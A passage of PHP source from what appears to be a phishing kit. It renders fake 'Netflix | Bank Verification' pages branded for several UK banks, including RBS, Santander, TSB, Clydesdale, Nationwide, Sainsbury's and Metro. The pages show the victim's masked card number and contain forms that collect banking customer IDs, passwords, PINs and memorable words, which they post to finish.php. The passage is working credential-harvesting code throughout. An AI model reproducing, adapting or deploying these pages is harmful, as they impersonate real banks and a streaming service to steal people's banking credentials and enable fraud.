                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=rbs">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Customer ID:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Pin:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="memWord" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'santander'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/santander.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=santander">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Customer ID:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Security Pin:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="memWord" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'tsb'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/tsb.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=tsb">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Customer ID:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="memWord" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'clydesdale'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/clydesdale.jpg" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=clydesdale">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Membership Number:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Passcode:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'nation'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/nation.gif" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=nation">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Membership Number:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Passcode:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'sains'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/sains2.jpg" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=sains">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="memWord" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'metro'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/metro.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
